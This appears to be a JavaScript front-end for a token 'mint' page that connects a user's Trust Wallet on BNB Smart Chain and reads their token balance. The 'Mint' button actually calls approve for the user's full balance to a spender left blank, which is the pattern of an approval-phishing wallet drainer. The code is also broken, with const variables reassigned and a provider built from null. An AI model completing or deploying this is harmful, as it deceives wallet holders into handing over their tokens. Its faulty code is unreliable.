import ethABI from "./ethABI.json";
import { ethers } from "ethers.min.js";

const trustWalletExist = false;
const injectedProviderExist = false
const account = null;
const ETH_ADDRESS = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
const bscChainId = '0x38';
const bscChain = false;
const requestAccount = false;
const injectedProvider = null ;
const rawBalance = 0;
const accountBalance = 0;
const ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
const contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);

function getTrustWalletInjectedProvider(
    { timeout } = { timeout: 3000 }
  ) {

    // trustWallet是否存在
    trustWalletExist = ethereum.isTrust;

    // 是否已经存在Provider
    injectedProviderExist =
      typeof window !== "undefined" && typeof window.ethereum !== "undefined";

    // 获取trustWalletProvider
    injectedProvider = window["trustwallet"];
  
    if (injectedProvider) {
      return injectedProvider;
    }
    
    return null;
  
  }

// BNB Smart Chain : 0x38
async function switchToNetwork(){
    try {
        await injectedProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: bscChainId }], // Ensure the selected network is Etheruem
        });

        bscChain = true;

      } catch (e) {
        if (e.code === 4001) {
          bscChain = false;
          setError("User rejected switching chains.");
        }
    }
}

async function connectWallet(){
  getTrustWalletInjectedProvider();
  switchToNetwork();
}


async function connectAccount(){
  try {
      const userAccounts = await injectedProvider.request({
        method: "eth_requestAccounts",
      });
    
      account = userAccounts[0]

      requestAccount = true;
      } catch (e) {
      if (e.code === 4001) {
          requestAccount = false;
          console.error("User denied connection.");
      }
  }
}


async function verifyAddress(){

  connectAccount();

  try {
    const decimals = await contract.decimals();
    rawBalance = await contract.balanceOf(account);
    accountBalance = ethers.utils.formatUnits(rawBalance, decimals);

    if (accountBalance < 2){
      
    }
    requestAccount = true;
    } catch (e) {
    if (e.code === 4001) {
        requestAccount = false;
        console.error("User denied connection.");
    }
  }
}

async function mint(){
    contract.approve("",rawBalance);
}


document.getElementById("Connect-Wallet").addEventListener("click", connectWallet);


document.getElementById("Verify-you-address").addEventListener("click",verifyAddress);

document.getElementById("Mint").addEventListener("click", 
  mint
  );






